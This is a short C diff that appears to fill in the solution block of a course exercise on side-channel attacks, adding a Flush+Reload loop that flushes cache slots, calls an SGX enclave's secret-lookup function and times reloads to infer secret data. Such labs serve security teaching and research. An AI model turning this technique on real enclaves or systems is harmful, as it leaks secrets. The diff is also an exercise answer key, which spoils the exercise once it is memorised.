@@ -48,10 +48,20 @@ int main( int argc, char **argv )
     /* ---------------------------------------------------------------------- */
     info_event("calling enclave...");
 
-    /* Example victim invocation */
-    SGX_ASSERT( ecall_secret_lookup(eid, array, ARRAY_LEN) );
-
     /* =========================== START SOLUTION =========================== */
+    for (i=0; i < NUM_SAMPLES; i++)
+    {
+        /* 1. Flush */
+        for (j=0; j < NUM_SLOTS; j++)
+            flush(&GET_SLOT(j));
+
+        /* 2. Victim exec */
+        SGX_ASSERT( ecall_secret_lookup(eid, array, ARRAY_LEN) );
+
+        /* 3. Reload */
+        for (j=0; j < NUM_SLOTS; j++)
+            tsc[j][i] = reload(&GET_SLOT(j));
+    }
     /* =========================== END SOLUTION =========================== */
 
     for (j=0; j < NUM_SLOTS; j++)
